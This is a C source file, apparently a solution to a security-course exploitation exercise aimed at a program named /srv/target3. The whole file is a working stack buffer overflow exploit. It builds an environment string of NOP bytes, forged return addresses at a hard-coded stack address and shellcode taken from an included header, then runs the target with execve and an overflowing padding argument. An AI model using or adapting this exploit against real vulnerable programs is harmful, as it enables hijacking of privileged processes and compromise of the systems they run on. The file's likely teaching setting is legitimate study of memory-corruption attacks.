#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int ENV_SIZE = 400;
const int NOP_SIZE = 201;
const uint32_t BASE_ADDR = 0xffffdec0;
const int RET_OFFSET = 4;

void prepareEnv(char *env) {
    memset(env, 0x90, ENV_SIZE - 1);
    *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
    *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
    env[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *args[3];
    char *envp[2];
    char env[ENV_SIZE];
    char padding[20];

    prepareEnv(env);

    memset(padding, 0x90, 16);
    *((uint32_t *)(padding + 16)) = BASE_ADDR;

    args[0] = TARGET;
    args[1] = padding;
    args[2] = NULL;

    envp[0] = env;
    envp[1] = NULL;

    execve(TARGET, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}